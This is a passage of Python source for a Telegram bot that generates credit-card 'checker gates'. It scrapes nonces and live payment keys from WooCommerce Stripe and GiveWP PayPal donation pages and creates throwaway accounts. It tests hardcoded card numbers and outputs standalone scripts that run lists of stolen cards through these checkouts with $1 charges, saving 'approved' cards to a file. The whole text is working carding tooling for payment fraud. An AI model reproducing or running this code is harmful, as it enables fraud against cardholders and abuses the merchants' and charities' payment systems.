    email = f'u_{uuid.uuid4().hex[:8]}@gmail.com'
    password = f'P_{uuid.uuid4().hex[:8]}!'
    data = {'username': username, 'email': email, 'password': password, 'woocommerce-register-nonce': reg,'register': 'Register'}
    res2 = r.post(url=f"{link}/my-account/", headers=headers, data=data).text
    res3 = r.get(url=f"{link}/my-account/add-payment-method/", headers=headers)
    pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', res3.text)
    if pk_live2:
    	pk_live = pk_live2.group(1)
    else:
    	bot.edit_message_text(
        chat_id=massege.chat.id,
        message_id=ko,
        text=f'''Registration failed or page not found ⚠️''',
        parse_mode="HTML"
    )
    	return 
    acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)',res3.text)
    if acct2:
    	acct = f'&_stripe_account={acct2.group(1)}'
    else:
    	acct = ''                
    addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3.text)
    addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3.text)
    if addnonce2:
    	addnonce = addnonce2.group(1)
    elif addnonce3:
	    addnonce = addnonce3.group(1)
    else:
	    bot.edit_message_text(
        chat_id=massege.chat.id,
        message_id=ko,
        text=f'''The add key was not found ⚠️''',
        parse_mode="HTML"
    )
	    return 
	    
    headers = {'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': user}
    ccx = '5509890030729858|08|26|624'
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
    	yy = yy.split("20")[1]
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&key={pk_live}{acct}'
    res4= r.post('https://api.stripe.com/v1/payment_methods', data=data, headers=headers).json()
    if 'id' in res4:
    	payment_id = res4['id']
    else:
    	bot.edit_message_text(
	    chat_id=massege.chat.id,
  	  message_id=ko,
  	  text='''There is no option to add the Visa card details, or there is a problem with the website ⚠️''',
        parse_mode="HTML"
    )
    	return 
    	
    final_headers = {
		**headers,
		'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'{link}/my-account/add-payment-method/', 'Origin': f'{link}'}

    data = {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': addnonce }

    res5 = r.post(f'{link}/wp-admin/admin-ajax.php', data=data, headers=final_headers)
    try:
	    data = res5.json()
	    msg = data.get('data', {}).get('error', {}).get('message')
	    if not msg:
		    msg = html.escape(res5.text[:100])
    except:
    	msg = html.escape(res5.text[:100])

 
    
    
    text_content = f"""import requests
import re
import uuid
import random
import time
from user_agent import generate_user_agent

def Paymnt(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3].strip()
	if "20" in yy:
		yy = yy.split("20")[1]

	link = "{link}"
	user = generate_user_agent()
	r = requests.Session()
	headers = {{'user-agent': user}}
	res = r.get(url=f"{{link}}/my-account/", headers=headers).text
	reg2 = re.search('name="woocommerce-register-nonce" value="(.*?)"', res)
	if reg2:
	   reg = reg2.group(1)
	else:
		return 'Page not found ⚠️'
	username = f'u_{{uuid.uuid4().hex[:8]}}'
	email = f'u_{{uuid.uuid4().hex[:8]}}@gmail.com'
	password = f'P_{{uuid.uuid4().hex[:8]}}!'
	data = {{'username': username, 'email': email, 'password': password, 'woocommerce-register-nonce': reg,'register': 'Register'}}
	res2 = r.post(url=f"{{link}}/my-account/", headers=headers, data=data).text
	res3 = r.get(url=f"{{link}}/my-account/add-payment-method/", headers=headers)
	pk_live2 = re.search(r'(pk_live_[A-Za-z0-9_-]+)', res3.text)
	if pk_live2:
		pk_live = pk_live2.group(1)
	else:
		return 'Registration failed or page not found ⚠️'

	acct2 = re.search(r'(acct_[A-Za-z0-9_-]+)',res3.text)
	if acct2:
		acct = f'&_stripe_account={{acct2.group(1)}}'
	else:
		acct = ''                
	addnonce2 = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', res3.text)
	addnonce3 = re.search(r'"createSetupIntentNonce":"(.*?)"', res3.text)
	if addnonce2:
		addnonce = addnonce2.group(1)
	elif addnonce3:
		addnonce = addnonce3.group(1)
	else:
		return 'The add key was not found ⚠️'
	    
	headers = {{'authority': 'api.stripe.com', 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/', 'user-agent': user}}

	data = f'type=card&card[number]={{n}}&card[cvc]={{cvc}}&card[exp_year]={{yy}}&card[exp_month]={{mm}}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6c35f76878%3B+stripe-js-v3%2F6c35f76878%3B+payment-element%3B+deferred-intent&key={{pk_live}}{{acct}}'
	
	res4= r.post('https://api.stripe.com/v1/payment_methods', data=data, headers=headers).json()
	if 'id' in res4:
		payment_id = res4['id']
	else:
		return 'There is no option to add the Visa card details, or there is a problem with the website ⚠️'
    	
	final_headers = {{'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'{link}/my-account/add-payment-method/', 'Origin': f'{link}', 'user-agent': user}}

	data = {{'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': payment_id, 'wc-stripe-payment-type': 'card', '_ajax_nonce': addnonce }}

	r5r = r.post(f'{{link}}/wp-admin/admin-ajax.php', data=data, headers=final_headers)
	r5 = r5r.text
	if 'Your card was declined.' in r5 or 'Your card could not be set up for future usage.' in r5:
		return 'Your card was declined.'
	elif 'success' in r5 or 'Success' in r5:
		return 'Approved'
	elif 'Your card number is incorrect.' in r5:
		return 'Your card number is incorrect.'
	elif '0' in r5:
		return 'Erorr Respon'
	else:
		try:
			return r5r.json()['data']['error']['message']
		except:
			return r5


if __name__ == '__main__':
        Getat = 'Stripe Auth'
        print(f'Cheker {{Getat}}')
        Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
        if Br == '1':
                try:
                    while True:
                        ar = input('Enter Card ( n | mm | yy | cvc ): ')
                        resulti = Paymnt(ar)
                        if 'Approved' in resulti:
                            with open('Approved Card.txt', "a") as f:
                                f.write(ar +f': {{resulti}} > {{Getat}}')

                        print('Response: ' + resulti)
                        time.sleep(5)
                except Exception as e:
                    print('Error -', e)
        else:
                noy = 0
                cr = input('Enter Name Combo: ')
                with open(cr, "r") as f:
                        crads = f.read().splitlines()
                        print('Wait Checking Your Card ...')
                        for P in crads:
                                noy += 1
                                try:
                                        resulti = Paymnt(P)
                                except Exception as e:
                                        resulti = f'Erorr {{e}}'
                                if 'Approved' in resulti:
                                        with open('Approved Card.txt', "a") as f:
                                                f.write(P + ': {{resulti}} > {{Getat}}')
                                try:
                                        print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                                except:
                                        pass
                                time.sleep(7)

"""
    file_name = f'@B11HB_{massege.from_user.id}.py'
    with open(file_name, "w", encoding="utf-8") as f:
    	f.write(text_content)
    with open(file_name, "rb") as f:
        bot.send_document(
        chat_id=massege.chat.id,
        document=f,
        caption=f'''The gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gatet information ...</strong>

[<a href="https://t.me/B">ϟ</a>] Link: <code>{link}</code>
[<a href="https://t.me/B">ϟ</a>] nonce register: <code>{reg}</code>
[<a href="https://t.me/B">ϟ</a>] nonce add: <code>{addnonce}</code>
[<a href="https://t.me/B">ϟ</a>] pk_live: <code>{pk_live}</code>
[<a href="https://t.me/B">ϟ</a>] id payment: <code>{payment_id}</code>
[<a href="https://t.me/B">ϟ</a>] msg gatet: <code>{msg}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @B11HB''',
        parse_mode="HTML"
    )




















@bot.message_handler(func=lambda m: m.text.lower().startswith('.paypal') or m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    ko = bot.reply_to(massege, "- The gate is being withdrawn ...").message_id
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text='''- Please send the link like this:

<code>/paypal https://xxxxxxx.xxx/xxxx</code>''',
                parse_mode="HTML"
            )
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text="Invalid link format ❌",
                parse_mode="HTML"
            )
            return

        import requests
        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)

        if r.status_code != 200:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko,
                text=f"Site returned status: {r.status_code} ❌"
            )
            return

        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="Gate found ✅"
        )

    except requests.exceptions.Timeout:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="The site took too long to respond ⏳"
        )

    except requests.exceptions.ConnectionError:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="Connection error or site offline ❌"
        )

    except requests.exceptions.InvalidURL:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text="Invalid URL ❌"
        )

    except Exception as e:
        bot.edit_message_text(
            chat_id=massege.chat.id,
            message_id=ko,
            text=f"Error ❌\n<code>{e}</code>",
            parse_mode="HTML"
        )

    from user_agent import generate_user_agent
    import requests,base64
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    import re
    import time
    user = generate_user_agent()
    r = requests.Session()
    headers = {'user-agent': user}
    res = r.get(url=f"{link}", headers=headers).text
    id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
    id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
    nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
    anc = re.search(r'"data-client-token":"(.*?)"',res)
    if anc:
    	import base64
    	enc = re.search(r'"data-client-token":"(.*?)"',res).group(1)
    	dec = base64.b64decode(enc).decode('utf-8')
    	au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
    else:
        bot.edit_message_text(
        chat_id=massege.chat.id,
        message_id=ko,
        text='''Data Client Token not found ⚠️''',
        parse_mode="HTML"
    )
        return 
        
    from urllib.parse import urlparse
    parsed = urlparse(link)
    USER_URL2 = f'https://{parsed.netloc}'
    USER_URL = parsed.path        
        
    headers = {
	    'origin': f'{USER_URL2}',
	    'referer': f'{USER_URL}',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
    data = {
	    'give-honeypot': '',
	    'give-form-id-prefix': id_form1,
	    'give-form-id': id_form2,
	    'give-form-title': '',
	    'give-current-url': f'{USER_URL}',
	    'give-form-url': f'{USER_URL}',
	    'give-form-minimum': f'1.00',
	    'give-form-maximum': '999999.99',
	    'give-form-hash': nonec,
	    'give-price-id': '3',
	    'give-recurring-logged-in-only': '',
	    'give-logged-in-only': '1',
	    '_give_is_donation_recurring': '0',
	    'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
	    'give-amount': f'1.00',
	    'give_stripe_payment_method': '',
	    'payment-mode': 'paypal-commerce',
	    'give_first': 'Ali',
	    'give_last': 'rights and',
	    'give_email': 'Ali22@gmail.com',
	    'card_name': 'Ali ',
	    'card_exp_month': '',
	    'card_exp_year': '',
	    'give_action': 'purchase',
	    'give-gateway': 'paypal-commerce',
	    'action': 'give_process_donation',
	    'give_ajax': 'true',
	}
	
    response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    data = MultipartEncoder({
    'give-honeypot': (None, ''),
    'give-form-id-prefix': (None, id_form1),
    'give-form-id': (None, id_form2),
    'give-form-title': (None, ''),
    'give-current-url': (None, f'{USER_URL}'),
    'give-form-url': (None, f'{USER_URL}'),
    'give-form-minimum': (None, f'1.00'),
    'give-form-maximum': (None, '999999.99'),
    'give-form-hash': (None, nonec),
    'give-price-id': (None, '3'),
    'give-recurring-logged-in-only': (None, ''),
    'give-logged-in-only': (None, '1'),
    '_give_is_donation_recurring': (None, '0'),
    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
    'give-amount': (None, f'1.00'),
    'give_stripe_payment_method': (None, ''),
    'payment-mode': (None, 'paypal-commerce'),
    'give_first': (None, 'Ali'),
    'give_last': (None, 'rights and'),
    'give_email': (None, 'Ali22@gmail.com'),
    'card_name': (None, 'Ali '),
    'card_exp_month': (None, ''),
    'card_exp_year': (None, ''),
    'give-gateway': (None, 'paypal-commerce'),
})
    headers = {
	    'content-type': data.content_type,
	    'origin': f'{USER_URL2}',
	    'referer': f'{USER_URL}',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
	
    params = {
	    'action': 'give_paypal_commerce_create_order',
	}
	
    response = r.post(
	    f'{USER_URL2}/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data
	)
    pk_live2 = (response.json()['data']['id'])
    if pk_live2:
    	tok = pk_live2
    else:
    	bot.edit_message_text(
        chat_id=massege.chat.id,
        message_id=ko,
        text=f'''Token not In Datat️''',
        parse_mode="HTML"
    )
    	return 
    headers = {
	    'authority': 'cors.api.paypal.com',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
    ccx = '4059986126444431|11|30|947'
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
    	yy = yy.split("20")[1]
    json_data = {
	    'payment_source': {
	        'card': {
	            'number': n,
	            'expiry': f'20{yy}-{mm}',
	            'security_code': cvc,
	            'attributes': {
	                'verification': {
	                    'method': 'SCA_WHEN_REQUIRED',
	                },
	            },
	        },
	    },
	    'application_context': {
	        'vault': False,
	    },
	}
	
    response = r.post(
	    f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
	    headers=headers,
	    json=json_data,
	)
		
    data = MultipartEncoder({
	    'give-honeypot': (None, ''),
	    'give-form-id-prefix': (None, id_form1),
	    'give-form-id': (None, id_form2),
	    'give-form-title': (None, ''),
	    'give-current-url': (None, f'{USER_URL}'),
	    'give-form-url': (None, f'{USER_URL}'),
	    'give-form-minimum': (None, f'1.00'),
	    'give-form-maximum': (None, '999999.99'),
	    'give-form-hash': (None, nonec),
	    'give-price-id': (None, '3'),
	    'give-recurring-logged-in-only': (None, ''),
	    'give-logged-in-only': (None, '1'),
	    '_give_is_donation_recurring': (None, '0'),
	    'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
	    'give-amount': (None, f'1.00'),
	    'give_stripe_payment_method': (None, ''),
	    'payment-mode': (None, 'paypal-commerce'),
	    'give_first': (None, 'Ali'),
	    'give_last': (None, 'rights and'),
	    'give_email': (None, 'Ali22@gmail.com'),
	    'card_name': (None, 'Ali '),
	    'card_exp_month': (None, ''),
	    'card_exp_year': (None, ''),
	    'give-gateway': (None, 'paypal-commerce'),
	})
    headers = {
	    'content-type': data.content_type,
	    'origin': f'{USER_URL2}',
	    'referer': f'{USER_URL}',
	    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
	}
	
    params = {
	    'action': 'give_paypal_commerce_approve_order',
	    'order': tok,
	}
	
    response = r.post(
	    f'{USER_URL2}/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=r.cookies,
	    headers=headers,
	    data=data
	)
    if 'ORDER_NOT_APPROVED' in response.text:
    	aa = 'ORDER_NOT_APPROVED'
    else:
    	aa = response.json()['data']['error']
 
    try:
	    msg = aa
	    if not msg:
		    msg = html.escape(response.text[:100])
    except:
    	msg = html.escape(response.text[:100])

 
    
    
    text_content = f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
from urllib.parse import urlparse

class PayPal:
        def __init__(self):
                self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
                self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
                url = '{link}'
                parsed = urlparse(url)
                domain = parsed.netloc
                path = parsed.path
                self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
                self.donation = "1.00"
                self.url = domain
                self.inurl = path
                self.email = f"{{random.choice(self.first_name)}}{{random.choice(self.last_name)}}{{random.randint(100,999)}}@gmail.com"
                self.r = requests.Session()
                self.uu = UserAgent()



        def Key(self):
                he1 = {{
                        'upgrade-insecure-requests': '1',
                        'user-agent': self.uu.random,
                }}
                r1 = self.r.get(f'https://{{self.url}}{{self.inurl}}', headers=he1, )
                self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
                self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
                self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
                enc = re.search(r'"data-client-token":"(.*?)"',r1.text).group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                return self.au, self.id_form1, self.id_form2, self.nonec

        def Krs(self, ccx):
                ccx=ccx.strip()
                n = ccx.split("|")[0]
                mm = ccx.split("|")[1]
                yy = ccx.split("|")[2]
                cvc = ccx.split("|")[3].strip()
                if "20" in yy:
                        yy = yy.split("20")[1]
                he2 = {{
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                }}

                da1 = {{
                    'give-honeypot': '',
                    'give-form-id-prefix': self.id_form1,
                    'give-form-id': self.id_form2,
                    'give-form-title': 'Make a One-off Donation',
                    'give-current-url': f'https://{{self.url}}{{self.inurl}}',
                    'give-form-url': f'https://{{self.url}}{{self.inurl}}',
                    'give-form-minimum': self.donation,
                    'give-form-maximum': '50000',
                    'give-form-hash': self.nonec,
                    'give-price-id': 'custom',
                    'give-recurring-logged-in-only': '',
                    'give-logged-in-only': self.donation,
                    'give_recurring_donation_details': '{{"is_recurring":false}}',
                    'give-amount': self.donation,
                    'give_stripe_payment_method': '',
                    'payment-mode': 'paypal-commerce',
                    'give_first': random.choice(self.first_name),
                    'give_last': random.choice(self.last_name),
                    'give_email': self.email,
                    'card_name': 'msms',
                    'card_exp_month': '',
                    'card_exp_year': '',
                    'give_gift_check_is_billing_address': 'no',
                    'give_gift_aid_address_option': 'billing_address',
                    'give_gift_aid_card_first_name': '',
                    'give_gift_aid_card_last_name': '',
                    'give_gift_aid_billing_country': 'GB',
                    'give_gift_aid_card_address': '',
                    'give_gift_aid_card_address_2': '',
                    'give_gift_aid_card_city': '',
                    'give_gift_aid_card_state': '',
                    'give_gift_aid_card_zip': '',
                    'give_action': 'purchase',
                    'give-gateway': 'paypal-commerce',
                    'action': 'give_process_donation',
                    'give_ajax': 'true',
                }}

                r2 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', headers=he2, data=da1, )

                da2 = MultipartEncoder({{
                    'give-honeypot': (None, ''),
                    'give-form-id-prefix': (None, self.id_form1),
                    'give-form-id': (None, self.id_form2),
                    'give-form-title': (None, 'Make a One-off Donation'),
                    'give-current-url': (None, f'https://{{self.url}}{{self.inurl}}',),
                    'give-form-url': (None, f'https://{{self.url}}{{self.inurl}}',),
                    'give-form-minimum': (None, '1'),
                    'give-form-maximum': (None, '50000'),
                    'give-form-hash': (None, self.nonec),
                    'give-price-id': (None, 'custom'),
                    'give-recurring-logged-in-only': (None, ''),
                    'give-logged-in-only': (None, '1'),
                    'give_recurring_donation_details': (None, '{{"is_recurring":false}}'),
                    'give-amount': (None, '1'),
                    'give_stripe_payment_method': (None, ''),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, random.choice(self.first_name)),
                    'give_last': (None, random.choice(self.last_name)),
                    'give_email': (None, self.email),
                    'card_name': (None, 'ali'),
                    'card_exp_month': (None, ''),
                    'card_exp_year': (None, ''),
                   'give_gift_check_is_billing_address': (None, 'no'),
                    'give_gift_aid_address_option': (None, 'billing_address'),
                    'give_gift_aid_card_first_name': (None, ''),
                    'give_gift_aid_card_last_name': (None, ''),
                    'give_gift_aid_billing_country': (None, 'GB'),
                    'give_gift_aid_card_address': (None, ''),
                    'give_gift_aid_card_address_2': (None, ''),
                    'give_gift_aid_card_city': (None, ''),
                    'give_gift_aid_card_state': (None, ''),
                    'give_gift_aid_card_zip': (None, ''),
                    'give-gateway': (None, 'paypal-commerce'),
                }})

                he3 = {{
                    'accept': '*/*',
                    'content-type': da2.content_type,
                    'user-agent': self.uu.random,
                }}

                pa1 = {{
                    'action': 'give_paypal_commerce_create_order',
                }}

                r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1,headers=he3,data=da2, ).json()['data']['id']


                he4 = {{
                    'authority': 'cors.api.paypal.com',
                    'accept': '*/*',
                    'authorization': f'Bearer {{self.au}}',
                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                    'paypal-client-metadata-id': self.paypal,
                    'user-agent': self.uu.random,
                }}

                da3 = {{
                    'payment_source': {{
                        'card': {{
                            'number': n,
                            'expiry': f'20{{yy}}-{{mm}}',
                            'security_code': cvc,
                            'attributes': {{
                                'verification': {{
                                    'method': 'SCA_WHEN_REQUIRED',
                                }},
                            }},
                        }},
                    }},
                    'application_context': {{
                        'vault': False,
                    }},
                }}

                r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3, )


                da4=MultipartEncoder({{
                    'give-honeypot': (None, ''),
                    'give-form-id-prefix': (None, self.id_form1),
                    'give-form-id': (None, self.id_form2),
                    'give-form-title': (None, 'Make a One-off Donation'),
                    'give-current-url': (None, f'https://{{self.url}}{{self.inurl}}'),
                    'give-form-url': (None, f'https://{{self.url}}{{self.inurl}}'),
                    'give-form-minimum': (None, '1'),
                    'give-form-maximum': (None, '50000'),
                    'give-form-hash': (None, self.nonec),
                    'give-price-id': (None, 'custom'),
                    'give-recurring-logged-in-only': (None, ''),
                    'give-logged-in-only': (None, self.donation),
                    'give_recurring_donation_details': (None, '{{"is_recurring":false}}'),
                    'give-amount': (None, self.donation),
                    'give_stripe_payment_method': (None, ''),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, random.choice(self.first_name)),
                    'give_last': (None, random.choice(self.last_name)),
                    'give_email': (None, self.email),
                    'card_name': (None, 'ali'),
                    'card_exp_month': (None, ''),
                    'card_exp_year': (None, ''),
                    'give_gift_check_is_billing_address': (None, 'no'),
                    'give_gift_aid_address_option': (None, 'billing_address'),
                    'give_gift_aid_card_first_name': (None, ''),
                    'give_gift_aid_card_last_name': (None, ''),
                    'give_gift_aid_billing_country': (None, 'GB'),
                    'give_gift_aid_card_address': (None, ''),
                    'give_gift_aid_card_address_2': (None, ''),
                    'give_gift_aid_card_city': (None, ''),
                    'give_gift_aid_card_state': (None, ''),
                    'give_gift_aid_card_zip': (None, ''),
                    'give-gateway': (None, 'paypal-commerce'),

                }})

                he5 = {{
                    'accept': '*/*',
                    'content-type': da4.content_type,
                    'user-agent': self.uu.random,
                }}

                pa2 = {{
                    'action': 'give_paypal_commerce_approve_order',
                    'order': r3,
                }}

                r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2,headers=he5, data=da4, )

                text = r5.text
                if 'true' in text or 'sucsess' in text:
                        return 'CHARGE 1.00$'
                elif 'DO_NOT_HONOR' in text:
                        return "DO_NOT_HONOR"
                elif 'ACCOUNT_CLOSED' in text:
                        return "ACCOUNT_CLOSED"
                elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
                        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
                elif 'LOST_OR_STOLEN' in text:
                        return "LOST_OR_STOLEN"
                elif 'CVV2_FAILURE' in text:
                        return "CVV2_FAILURE"
                elif 'SUSPECTED_FRAUD' in text:
                        return "SUSPECTED_FRAUD"
                elif 'INVALID_ACCOUNT' in text:
                        return "INVALID_ACCOUNT"
                elif 'REATTEMPT_NOT_PERMITTED' in text:
                        return "REATTEMPT_NOT_PERMITTED"
                elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
                        return "ACCOUNT_BLOCKED_BY_ISSUER"
                elif 'ORDER_NOT_APPROVED' in text:
                        return "ORDER_NOT_APPROVED"
                elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
                        return "PICKUP_CARD_SPECIAL_CONDITIONS"
                elif 'PAYER_CANNOT_PAY' in text:
                        return "PAYER_CANNOT_PAY"
                elif 'INSUFFICIENT_FUNDS' in text:
                        return "INSUFFICIENT_FUNDS"
                elif 'GENERIC_DECLINE' in text:
                        return "GENERIC_DECLINE"
                elif 'COMPLIANCE_VIOLATION' in text:
                        return "COMPLIANCE_VIOLATION"
                elif 'TRANSACTION_NOT_PERMITTED' in text:
                        return "TRANSACTION_NOT_PERMITTED"
                elif 'PAYMENT_DENIED' in text:
                        return "PAYMENT_DENIED"
                elif 'INVALID_TRANSACTION' in text:
                        return "INVALID_TRANSACTION"
                elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
                        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
                elif 'SECURITY_VIOLATION' in text:
                        return "SECURITY_VIOLATION"
                elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
                        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
                elif 'INVALID_OR_RESTRICTED_CARD' in text:
                        return "INVALID_OR_RESTRICTED_CARD"
                elif 'EXPIRED_CARD' in text:
                        return "EXPIRED_CARD"
                elif 'CRYPTOGRAPHIC_FAILURE' in text:
                        return "CRYPTOGRAPHIC_FAILURE"
                elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
                        return "TRANSACTION_CANNOT_BE_COMPLETED"
                elif 'DECLINED_PLEASE_RETRY' in text:
                        return "DECLINED_PLEASE_RETRY_LATER"
                elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
                        return "TX_ATTEMPTS_EXCEED_LIMIT"
                else:
                        try:
                                result = r5.json()['data']['error']
                                return result
                        except:
                                return "UNKNOWN_ERROR"



if __name__ == '__main__':
        Getat = 'PayPal Custom 1$'
        print(f'Cheker {{Getat}}')
        Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
        if Br == '1':
                try:
                    while True:
                        ar = input('Enter Card ( n | mm | yy | cvc ): ')
                        rr = PayPal()
                        itt = rr.Key()
                        pali = rr.Krs
                        resulti = pali(ar)
                        if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                            with open('Approved Card.txt', "a") as f:
                                f.write(ar +f': {{resulti}} > {{Getat}}')

                        print('Response: ' + resulti)
                        time.sleep(5)
                except Exception as e:
                    print('Error -', e)
        else:
                noy = 0
                cr = input('Enter Name Combo: ')
                with open(cr, "r") as f:
                        crads = f.read().splitlines()
                        print('Wait Checking Your Card ...')
                        for P in crads:
                                noy += 1
                                try:
                                        rr = PayPal()
                                        itt = rr.Key()
                                        pali = rr.Krs
                                        resulti = pali(P)
                                except Exception as e:
                                        resulti = f'Erorr {{e}}'
                                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                                        with open('Approved Card.txt', "a") as f:
                                                f.write(P + ': {{resulti}} > {{Getat}}')
                                try:
                                        print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                                except:
                                        pass
                                time.sleep(13)'''
